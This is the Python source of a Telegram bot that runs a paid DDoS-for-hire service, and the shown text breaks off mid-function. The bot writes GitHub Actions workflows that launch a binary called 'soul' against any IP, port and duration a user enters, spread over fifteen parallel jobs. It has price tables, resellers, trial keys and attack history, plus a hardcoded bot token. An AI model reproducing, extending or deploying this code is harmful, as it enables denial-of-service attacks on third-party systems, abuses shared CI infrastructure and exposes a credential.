import os
import json
import logging
import threading
import time
import random
import string
import asyncio
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
OWNER_IDS = [8101867786]

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 1000
user_attack_counts = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

def to_small_caps(text):
    small_caps_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 
        'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
        'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
        'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ',
        'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ',
        'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
        'Y': 'ʏ', 'Z': 'ᴢ'
    }
    return ''.join(small_caps_map.get(c, c) for c in text)

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            return data if data else default
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
groups = load_json('groups.json', {})
pending_users = load_json('pending_users.json', [])
trial_keys = load_json('trial_keys.json', {})
user_attack_counts = load_json('user_attack_counts.json', {})

if not owners:
    for owner_id in OWNER_IDS:
        owners[str(owner_id)] = {"username": f"owner_{owner_id}", "added_by": "system", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": True}
    save_json('owners.json', owners)

MAINTENANCE_MODE = load_json('maintenance.json', {"maintenance": False}).get("maintenance", False)
COOLDOWN_DURATION = load_json('cooldown.json', {"cooldown": 40}).get("cooldown", 40)
MAX_ATTACKS = load_json('max_attacks.json', {"max_attacks": 1000}).get("max_attacks", 1000)
AUTO_APPROVE = load_json('auto_approve.json', {"enabled": False, "days": 7}).get("enabled", False)
AUTO_APPROVE_DAYS = load_json('auto_approve.json', {"enabled": False, "days": 7}).get("days", 7)

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_primary_owner(user_id):
    owner_data = owners.get(str(user_id), {})
    return owner_data.get('is_primary', False)

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry = approved_users[user_id_str].get('expiry')
        if expiry == "LIFETIME":
            return True
        if time.time() < expiry:
            return True
        del approved_users[user_id_str]
        save_json('approved_users.json', approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def update_yml_file(token, repo_name, ip, port, time_val):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack {ip}:{port}", yml_content, file_content.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack {ip}:{port}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except:
        return 0

def generate_trial_key(hours):
    key = "TRL-" + "-".join([''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3)])
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {"created": time.time(), "expiry": expiry, "used": False, "hours": hours}
    save_json('trial_keys.json', trial_keys)
    return key

def redeem_trial_key(key, user_id):
    if key not in trial_keys:
        return False, "Invalid key"
    if trial_keys[key]['used']:
        return False, "Key already used"
    if time.time() > trial_keys[key]['expiry']:
        return False, "Key expired"
    
    hours = trial_keys[key]['hours']
    expiry = time.time() + (hours * 3600)
    approved_users[str(user_id)] = {
        "username": f"trial_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": hours/24
    }
    save_json('approved_users.json', approved_users)
    
    trial_keys[key]['used'] = True
    trial_keys[key]['used_by'] = user_id
    trial_keys[key]['used_date'] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_json('trial_keys.json', trial_keys)
    
    return True, f"Trial access granted for {hours} hours"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, AUTO_APPROVE, AUTO_APPROVE_DAYS
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or "user"
    
    chat_type = update.effective_chat.type
    if chat_type in ['group', 'supergroup']:
        chat_id = str(update.effective_chat.id)
        if chat_id not in groups:
            groups[chat_id] = {"name": update.effective_chat.title, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_json('groups.json', groups)
    
    if not can_user_attack(user_id):
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        
        if AUTO_APPROVE and not user_exists:
            expiry = time.time() + (AUTO_APPROVE_DAYS * 86400)
            approved_users[str(user_id)] = {
                "username": username,
                "added_by": "auto_approve",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "expiry": expiry,
                "days": AUTO_APPROVE_DAYS
            }
            save_json('approved_users.json', approved_users)
            
            for owner_id in owners.keys():
                try:
                    msg = f"╔═══════════════════════╗\n"
                    msg += f"║  {to_small_caps('AUTO APPROVED')}  ║\n"
                    msg += f"╚═══════════════════════╝\n\n"
                    msg += f"┌─────────────────┐\n"
                    msg += f"│ {to_small_caps('Name')}: {first_name}\n"
                    msg += f"│ {to_small_caps('Username')}: @{username}\n"
                    msg += f"│ {to_small_caps('Days')}: {AUTO_APPROVE_DAYS}\n"
                    msg += f"└─────────────────┘"
                    await context.bot.send_message(chat_id=int(owner_id), text=msg)
                except:
                    pass
        
        if not user_exists and not AUTO_APPROVE:
            pending_users.append({
                'user_id': user_id,
                'username': username,
                'first_name': first_name,
                'request_date': time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_json('pending_users.json', pending_users)
            
            for owner_id in owners.keys():
                try:
                    msg = f"╔═══════════════════════╗\n"
                    msg += f"║  {to_small_caps('NEW ACCESS REQUEST')}  ║\n"
                    msg += f"╚═══════════════════════╝\n\n"
                    msg += f"┌─────────────────┐\n"
                    msg += f"│ 🆔 {to_small_caps('ID')}: {user_id}\n"
                    msg += f"│ 👤 {to_small_caps('Name')}: {first_name}\n"
                    msg += f"│ 👤 {to_small_caps('Username')}: @{username}\n"
                    msg += f"└─────────────────┘\n\n"
                    msg += f"💡 {to_small_caps('Use')}: /add {user_id} <days>"
                    await context.bot.send_message(chat_id=int(owner_id), text=msg)
                except:
                    pass
        
        if not can_user_attack(user_id):
            text = f"╔═══════════════════════╗\n"
            text += f"║  {to_small_caps('ACCESS PENDING')}  ║\n"
            text += f"╚═══════════════════════╝\n\n"
            text += f"⏳ {to_small_caps('Your request is pending')}\n"
            text += f"👑 {to_small_caps('Contact admin for access')}\n\n"
            text += f"🆔 {to_small_caps('Your ID')}: `{user_id}`"
            
            await update.message.reply_text(text)
            return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  ⚡ {to_small_caps('DDOS BOT')} ⚡  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"👋 {to_small_caps('Welcome')} {first_name}!\n\n"
    
    if is_owner(user_id):
        text += f"🎭 {to_small_caps('Role')}: 👑 {to_small_caps('Owner')}\n"
    elif is_admin(user_id):
        text += f"🎭 {to_small_caps('Role')}: ⚡ {to_small_caps('Admin')}\n"
    elif is_reseller(user_id):
        text += f"🎭 {to_small_caps('Role')}: 💎 {to_small_caps('Reseller')}\n"
    else:
        text += f"🎭 {to_small_caps('Role')}: ✨ {to_small_caps('User')}\n"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    text += f"🎯 {to_small_caps('Attacks left')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"🔧 {to_small_caps('Status')}: {'🔴 Maintenance' if MAINTENANCE_MODE else '🟢 Active'}"
    
    keyboard = []
    
    if can_user_attack(user_id):
        keyboard.append([InlineKeyboardButton(f"🚀 {to_small_caps('Launch Attack')}", callback_data="attack_panel")])
    
    keyboard.append([
        InlineKeyboardButton(f"👤 {to_small_caps('My Access')}", callback_data="my_access"),
        InlineKeyboardButton(f"📊 {to_small_caps('Status')}", callback_data="status")
    ])
    
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([InlineKeyboardButton(f"⚙️ {to_small_caps('Admin Panel')}", callback_data="admin_panel")])
    
    if is_reseller(user_id):
        keyboard.append([InlineKeyboardButton(f"💰 {to_small_caps('Reseller Panel')}", callback_data="reseller_panel")])
    
    keyboard.append([
        InlineKeyboardButton(f"❓ {to_small_caps('Help')}", callback_data="help"),
        InlineKeyboardButton(f"🔑 {to_small_caps('Redeem Trial')}", callback_data="redeem_trial_info")
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def show_attack_panel(query):
    user_id = query.from_user.id
    
    if not can_user_attack(user_id):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  🚀 {to_small_caps('ATTACK PANEL')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"🎯 {to_small_caps('Choose an option')}:\n\n"
    text += f"💡 {to_small_caps('Launch')}: {to_small_caps('Start new attack')}\n"
    text += f"🛑 {to_small_caps('Stop')}: {to_small_caps('Stop current attack')}\n"
    text += f"📊 {to_small_caps('History')}: {to_small_caps('View past attacks')}\n"
    text += f"📝 {to_small_caps('Logs')}: {to_small_caps('View attack logs')}"
    
    keyboard = [
        [InlineKeyboardButton(f"🚀 {to_small_caps('Launch Attack')}", callback_data="launch_attack")],
        [InlineKeyboardButton(f"🛑 {to_small_caps('Stop Attack')}", callback_data="stop_attack")],
        [
            InlineKeyboardButton(f"📊 {to_small_caps('History')}", callback_data="attack_history"),
            InlineKeyboardButton(f"📝 {to_small_caps('Logs')}", callback_data="attack_logs")
        ],
        [InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def launch_attack(query, context: ContextTypes.DEFAULT_TYPE):
    user_id = query.from_user.id
    
    if not can_user_attack(user_id):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if MAINTENANCE_MODE:
        text = f"╔════════════════════════╗\n"
        text += f"║  🔧 {to_small_caps('MAINTENANCE')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"🔴 {to_small_caps('Bot is under maintenance')}\n"
        text += f"⏳ {to_small_caps('Please try again later')}"
        keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    with attack_lock:
        if current_attack and time.time() < current_attack['end_time']:
            remaining_time = int(current_attack['end_time'] - time.time())
            text = f"╔════════════════════════╗\n"
            text += f"║  ⚠️ {to_small_caps('ATTACK RUNNING')}  ║\n"
            text += f"╚════════════════════════╝\n\n"
            text += f"🎯 {to_small_caps('Target')}: {current_attack['ip']}:{current_attack['port']}\n"
            text += f"⏱️ {to_small_caps('Time left')}: {remaining_time}s\n"
            text += f"👤 {to_small_caps('User')}: {current_attack.get('username', 'Unknown')}"
            keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_panel")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        if time.time() < cooldown_until:
            remaining_cooldown = int(cooldown_until - time.time())
            text = f"╔════════════════════════╗\n"
            text += f"║  ⏳ {to_small_caps('COOLDOWN')}  ║\n"
            text += f"╚════════════════════════╝\n\n"
            text += f"⏰ {to_small_caps('Please wait')}: {remaining_cooldown}s"
            keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_panel")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  🚀 {to_small_caps('NEW ATTACK')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"📝 {to_small_caps('Send attack details')}:\n\n"
    text += f"💡 {to_small_caps('Format')}: IP PORT TIME\n"
    text += f"📌 {to_small_caps('Example')}: 1.1.1.1 80 60"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Cancel')}", callback_data="attack_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    context.user_data['waiting_attack'] = True

async def stop_attack_handler(query):
    global current_attack, cooldown_until
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id) or (current_attack and current_attack.get('user_id') == user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('You can only stop your own attacks')}")
        return
    
    with attack_lock:
        if not current_attack:
            text = f"╔════════════════════════╗\n"
            text += f"║  ℹ️ {to_small_caps('NO ATTACK')}  ║\n"
            text += f"╚════════════════════════╝\n\n"
            text += f"📭 {to_small_caps('No attack is running')}"
            keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_panel")]]
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        stopped_count = 0
        for token_data in github_tokens:
            token = token_data['token']
            repo = token_data['repo']
            stopped_count += instant_stop_all_jobs(token, repo)
        
        attack_info = current_attack.copy()
        current_attack = None
        cooldown_until = 0
        
        text = f"╔════════════════════════╗\n"
        text += f"║  ✅ {to_small_caps('ATTACK STOPPED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"🎯 {to_small_caps('Target')}: {attack_info['ip']}:{attack_info['port']}\n"
        text += f"🛑 {to_small_caps('Jobs stopped')}: {stopped_count}"
        
        keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def attack_history(query):
    user_id = query.from_user.id
    
    history = load_json('attack_history.json', [])
    
    if is_owner(user_id) or is_admin(user_id):
        user_history = history[-10:]
    else:
        user_history = [h for h in history if h.get('user_id') == user_id][-10:]
    
    if not user_history:
        text = f"╔════════════════════════╗\n"
        text += f"║  📊 {to_small_caps('ATTACK HISTORY')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📭 {to_small_caps('No attacks found')}"
    else:
        text = f"╔════════════════════════╗\n"
        text += f"║  📊 {to_small_caps('ATTACK HISTORY')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        for i, attack in enumerate(reversed(user_history), 1):
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('ATTACK')} #{i}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            text += f"├ 🎯 {to_small_caps('Target')}: {attack.get('ip')}:{attack.get('port')}\n"
            text += f"├ ⏱️ {to_small_caps('Time')}: {attack.get('time')}s\n"
            text += f"├ 👤 {to_small_caps('User')}: {attack.get('username', 'Unknown')}\n"
            text += f"└ 📅 {to_small_caps('Date')}: {attack.get('date')}\n\n"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def attack_logs(query):
    text = f"╔════════════════════════╗\n"
    text += f"║  📝 {to_small_caps('ATTACK LOGS')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    if current_attack:
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('CURRENT ATTACK')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 🎯 {to_small_caps('Target')}: {current_attack['ip']}:{current_attack['port']}\n"
        text += f"├ ⏱️ {to_small_caps('Duration')}: {current_attack['time']}s\n"
        text += f"├ 👤 {to_small_caps('User')}: {current_attack.get('username', 'Unknown')}\n"
        remaining = int(current_attack['end_time'] - time.time())
        text += f"└ ⏰ {to_small_caps('Remaining')}: {remaining}s"
    else:
        text += f"📭 {to_small_caps('No active attack')}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_panel(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  ⚙️ {to_small_caps('ADMIN PANEL')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"🎯 {to_small_caps('Total users')}: {len(approved_users)}\n"
    text += f"⏳ {to_small_caps('Pending')}: {len(pending_users)}\n"
    text += f"🔑 {to_small_caps('Servers')}: {len(github_tokens)}\n"
    text += f"🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}"
    
    keyboard = [
        [
            InlineKeyboardButton(f"👥 {to_small_caps('Users')}", callback_data="manage_users"),
            InlineKeyboardButton(f"📊 {to_small_caps('Stats')}", callback_data="stats")
        ],
        [
            InlineKeyboardButton(f"🔑 {to_small_caps('Servers')}", callback_data="servers"),
            InlineKeyboardButton(f"🎫 {to_small_caps('Trial Keys')}", callback_data="trial_keys")
        ],
        [InlineKeyboardButton(f"⚙️ {to_small_caps('Settings')}", callback_data="attack_settings")],
        [InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def manage_users(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  👥 {to_small_caps('USER MANAGEMENT')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"✅ {to_small_caps('Approved')}: {len(approved_users)}\n"
    text += f"⏳ {to_small_caps('Pending')}: {len(pending_users)}\n"
    text += f"⚡ {to_small_caps('Admins')}: {len(admins)}\n"
    text += f"💎 {to_small_caps('Resellers')}: {len(resellers)}"
    
    keyboard = [
        [
            InlineKeyboardButton(f"✅ {to_small_caps('Approved')}", callback_data="show_approved"),
            InlineKeyboardButton(f"⏳ {to_small_caps('Pending')}", callback_data="show_pending")
        ],
        [InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="admin_panel")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def show_approved(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if not approved_users:
        text = f"╔════════════════════════╗\n"
        text += f"║  ✅ {to_small_caps('APPROVED USERS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📭 {to_small_caps('No approved users')}"
    else:
        text = f"╔════════════════════════╗\n"
        text += f"║  ✅ {to_small_caps('APPROVED USERS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        count = 0
        for uid, data in list(approved_users.items())[:10]:
            count += 1
            expiry = data.get('expiry', 0)
            if expiry == "LIFETIME":
                exp_text = "LIFETIME"
            else:
                days_left = int((expiry - time.time()) / 86400)
                exp_text = f"{days_left}d"
            
            text += f"├ 🆔 {uid}\n"
            text += f"│ 👤 {data.get('username', 'Unknown')}\n"
            text += f"│ 📅 {exp_text}\n"
            text += f"└─────────────────\n"
        
        if len(approved_users) > 10:
            text += f"\n📊 {to_small_caps('Showing 10 of')} {len(approved_users)}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="manage_users")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def show_pending(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if not pending_users:
        text = f"╔════════════════════════╗\n"
        text += f"║  ⏳ {to_small_caps('PENDING USERS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📭 {to_small_caps('No pending users')}"
    else:
        text = f"╔════════════════════════╗\n"
        text += f"║  ⏳ {to_small_caps('PENDING USERS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        for i, user_data in enumerate(pending_users[:10], 1):
            text += f"├ {i}. 🆔 {user_data['user_id']}\n"
            text += f"│ 👤 {user_data.get('first_name', 'Unknown')}\n"
            text += f"│ 📅 {user_data.get('request_date', 'Unknown')}\n"
            text += f"└─────────────────\n"
        
        if len(pending_users) > 10:
            text += f"\n📊 {to_small_caps('Showing 10 of')} {len(pending_users)}"
        
        text += f"\n\n💡 {to_small_caps('Use')}: /add <id> <days>"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="manage_users")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def stats(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    history = load_json('attack_history.json', [])
    total_attacks = len(history)
    
    text = f"╔════════════════════════╗\n"
    text += f"║  📊 {to_small_caps('STATISTICS')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('USER STATS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👑 {to_small_caps('Owners')}: {len(owners)}\n"
    text += f"├ ⚡ {to_small_caps('Admins')}: {len(admins)}\n"
    text += f"├ 💎 {to_small_caps('Resellers')}: {len(resellers)}\n"
    text += f"├ ✅ {to_small_caps('Approved')}: {len(approved_users)}\n"
    text += f"└ ⏳ {to_small_caps('Pending')}: {len(pending_users)}\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('SYSTEM STATS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 🔑 {to_small_caps('Servers')}: {len(github_tokens)}\n"
    text += f"├ 🚀 {to_small_caps('Total attacks')}: {total_attacks}\n"
    text += f"├ 👥 {to_small_caps('Groups')}: {len(groups)}\n"
    text += f"└ 🎫 {to_small_caps('Trial keys')}: {len(trial_keys)}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="admin_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def servers(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  🔑 {to_small_caps('SERVERS')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    if not github_tokens:
        text += f"📭 {to_small_caps('No servers configured')}\n\n"
        text += f"💡 {to_small_caps('Send .txt file with tokens')}"
    else:
        text += f"🔑 {to_small_caps('Total servers')}: {len(github_tokens)}\n\n"
        for i, token_data in enumerate(github_tokens[:5], 1):
            repo = token_data.get('repo', 'Unknown')
            text += f"├ {i}. {repo}\n"
        
        if len(github_tokens) > 5:
            text += f"\n📊 {to_small_caps('Showing 5 of')} {len(github_tokens)}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="admin_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def trial_keys_menu(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  🎫 {to_small_caps('TRIAL KEYS')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"🔑 {to_small_caps('Total keys')}: {len(trial_keys)}\n"
    
    used_count = sum(1 for k in trial_keys.values() if k.get('used'))
    text += f"✅ {to_small_caps('Used')}: {used_count}\n"
    text += f"⏰ {to_small_caps('Available')}: {len(trial_keys) - used_count}"
    
    keyboard = [
        [InlineKeyboardButton(f"➕ {to_small_caps('Generate Key')}", callback_data="generate_trial")],
        [InlineKeyboardButton(f"📋 {to_small_caps('View Keys')}", callback_data="view_trial_keys")],
        [InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="admin_panel")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def generate_trial_menu(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  🎫 {to_small_caps('GENERATE TRIAL')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"⏰ {to_small_caps('Select duration')}:"
    
    keyboard = [
        [
            InlineKeyboardButton(f"6 {to_small_caps('hours')}", callback_data="gen_trial_6"),
            InlineKeyboardButton(f"12 {to_small_caps('hours')}", callback_data="gen_trial_12")
        ],
        [
            InlineKeyboardButton(f"24 {to_small_caps('hours')}", callback_data="gen_trial_24"),
            InlineKeyboardButton(f"48 {to_small_caps('hours')}", callback_data="gen_trial_48")
        ],
        [InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="trial_keys")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def view_trial_keys(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if not trial_keys:
        text = f"╔════════════════════════╗\n"
        text += f"║  🎫 {to_small_caps('TRIAL KEYS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📭 {to_small_caps('No trial keys generated')}"
    else:
        text = f"╔════════════════════════╗\n"
        text += f"║  🎫 {to_small_caps('TRIAL KEYS')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        count = 0
        for key, data in list(trial_keys.items())[:5]:
            count += 1
            status = "✅ Used" if data.get('used') else "⏰ Active"
            text += f"├ 🔑 `{key}`\n"
            text += f"│ ⏰ {data.get('hours')}h\n"
            text += f"│ {status}\n"
            text += f"└─────────────────\n"
        
        if len(trial_keys) > 5:
            text += f"\n📊 {to_small_caps('Showing 5 of')} {len(trial_keys)}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="trial_keys")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def attack_settings(query):
    user_id = query.from_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  ⚙️ {to_small_caps('SETTINGS')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('CURRENT SETTINGS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}\n"
    text += f"├ ⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n"
